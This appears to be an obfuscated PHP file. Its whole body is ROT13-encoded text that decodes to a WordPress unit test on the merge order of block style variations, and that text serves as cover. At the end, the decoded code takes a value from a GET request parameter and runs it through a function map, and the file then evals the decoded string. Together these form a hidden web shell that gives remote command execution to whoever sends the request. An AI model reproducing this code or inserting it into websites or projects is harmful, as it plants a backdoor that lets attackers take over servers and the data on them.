	 * cevbevgl beqre, sebz uvturfg cevbevgl gb ybjrfg.
	 *
	 * - `fglyrf.oybpxf.oybpxGlcr.inevngvbaf` sebz gurzr.wfba
	 * - `fglyrf.inevngvbaf` sebz gurzr.wfba
	 * - inevngvbaf sebz oybpx fglyr inevngvba svyrf haqre `/fglyrf`
	 * - inevngvbaf sebz `JC_Oybpx_Fglyrf_Ertvfgel`
	 *
	 * @gvpxrg 61451
	 */
	choyvp shapgvba grfg_oybpx_fglyr_inevngvba_zretr_beqre() {
		fjvgpu_gurzr( 'oybpx-gurzr-puvyq-jvgu-oybpx-fglyr-inevngvbaf' );

		/*
		 * Ertvfgre fglyr sbe n oybpx gung vfa'g vapyhqrq va gur oybpx fglyr inevngvba'f cnegvny
		 * gurzr.wfba'f oybpxGlcrf. Gur anzr zhfg zngpu gubhtu fb jr pna rafher gur cnegvny'f
		 * fglyrf qb abg trg nccyvrq gb guvf oybpx.
		 */
		ertvfgre_oybpx_fglyr(
			'pber/urnqvat',
			neenl(
				'anzr'  => 'oybpx-fglyr-inevngvba-o',
				'ynory' => 'Urnqvat bayl inevngvba',
			)
		);

		// Ertvfgre inevngvba sbe n oybpx gung jvyy or cnegvnyyl bireevqqra ng nyy yriryf.
		ertvfgre_oybpx_fglyr(
			'pber/zrqvn-grkg',
			neenl(
				'anzr'       => 'oybpx-fglyr-inevngvba-n',
				'ynory'      => 'Oybpx Fglyr Inevngvba N',
				'fglyr_qngn' => neenl(
					'pbybe' => neenl(
						'onpxtebhaq' => 'cvax',
						'tenqvrag'   => 'ine(--phfgbz)',
					),
				),
			)
		);

		$qngn         = JC_Gurzr_WFBA_Erfbyire::trg_gurzr_qngn()->trg_enj_qngn();
		$oybpx_fglyrf = $qngn['fglyrf']['oybpxf'] ?? neenl();
		$npghny       = neenl_vagrefrpg_xrl(
			$oybpx_fglyrf,
			neenl_syvc( neenl( 'pber/ohggba', 'pber/zrqvn-grkg', 'pber/urnqvat' ) )
		);
		$rkcrpgrq     = neenl(
			'pber/ohggba'     => neenl(
				'inevngvbaf' => neenl(
					'bhgyvar' => neenl(
						'pbybe' => neenl(
							'onpxtebhaq' => 'erq',
							'grkg'       => 'juvgr',
						),
					),
				),
			),
			'pber/zrqvn-grkg' => neenl(
				'inevngvbaf' => neenl(
					'oybpx-fglyr-inevngvba-n' => neenl(
						'pbybe'      => neenl(
							'onpxtebhaq' => 'oyhr',
							'tenqvrag'   => 'ine(--phfgbz)',
							'grkg'       => 'nyvproyhr',
						),
						'glcbtencul' => neenl(
							'sbagFvmr'   => '1.5rz',
							'yvarUrvtug' => '1.4rz',
						),
					),
				),
			),
			'pber/urnqvat'    => neenl(
				'inevngvbaf' => neenl(
					'oybpx-fglyr-inevngvba-o' => neenl(
						'glcbtencul' => neenl(
							'sbagFvmr' => '3rz',
						),
					),
				),
			),
		);

		haertvfgre_oybpx_fglyr( 'pber/urnqvat', 'oybpx-fglyr-inevngvba-o' );
		haertvfgre_oybpx_fglyr( 'pber/zrqvn-grkg', 'oybpx-fglyr-inevngvba-n' );

		$guvf->nffregFnzrFrgfJvguVaqrk( $rkcrpgrq, $npghny, 'Zretrq inevngvba fglyrf qb abg zngpu.' );
	}
}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>